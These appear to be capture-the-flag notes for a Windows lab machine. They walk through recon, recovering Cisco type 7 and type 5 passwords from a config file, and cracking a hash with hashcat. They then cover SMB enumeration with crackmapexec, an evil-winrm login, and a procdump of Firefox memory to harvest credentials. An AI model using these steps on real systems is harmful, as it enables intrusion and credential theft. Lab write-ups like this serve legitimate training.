# recon
```
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp open  msrpc         Microsoft Windows RPC
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-28T08:15:06
|_  start_date: N/A
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Login as guest and get cisco config file in attachement
```cisco
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```

Encrypted rout3r password `0242114B0E143F015F5D1E161713` | decrypted password 
```
$uperP@ssword
```
Encrypted admin password `02375012182C1A1D751618034F36415408` | decrypted password 
```
Q4)sJu\Y8qz*A3?d
```

Identify hazard's secret 5 hash `$1$pdQG$o8nrSzsGXeaduXrjlvKc91` on hashes.com/en/tools/hash_identifier #crackPass
result : `Possible algorithms: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5), Cisco-IOS $1$ (MD5), Base64(unhex(SHA-1($plaintext)))`
Search hach mod on hashcat
```
hashcat -h | grep "Cisco-IOS \$1$ (MD5)" 
```
	 500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)

crack hash
```
hashcat -m 500 -a 0 hash rockyou
```
	`$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent`

password of hazard is 
```
stealth1agent
```
List shares
```
crackmapexec smb 10.129.96.157 -u 'hazard' -p 'stealth1agent' --shares
```
List users
```
crackmapexec smb 10.129.96.157 -u 'hazard' -p 'stealth1agent' --rid-brute 10000
```
	SUPPORTDESK\Administrator (SidTypeUser)
	SUPPORTDESK\Guest (SidTypeUser)
	SUPPORTDESK\DefaultAccount (SidTypeUser)
	SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
	SUPPORTDESK\None (SidTypeGroup)
	SUPPORTDESK\Hazard (SidTypeUser)
	SUPPORTDESK\support (SidTypeUser)
	SUPPORTDESK\Chase (SidTypeUser)
	SUPPORTDESK\Jason (SidTypeUser)

# foothold
```
evil-winrm -i 10.129.96.157 -u 'Chase' -p 'Q4)sJu\Y8qz*A3?d'
```
List running process
```
Get-Process
```
	1088      72   153448     231140       3.27   6260   1 firefox
	347      19    10376      38856       0.02   6368   1 firefox
	401      34    35600      95120       0.39   6600   1 firefox
	378      28    23348      60120       0.27   6792   1 firefox
	355      25    16512      39036       0.08   7068   1 firefox
Use procdump from sysinternal suits to dump firefox process information
```
./procdump64.exe -accepteula
```
```
./procdump64.exe -ma 6260
```

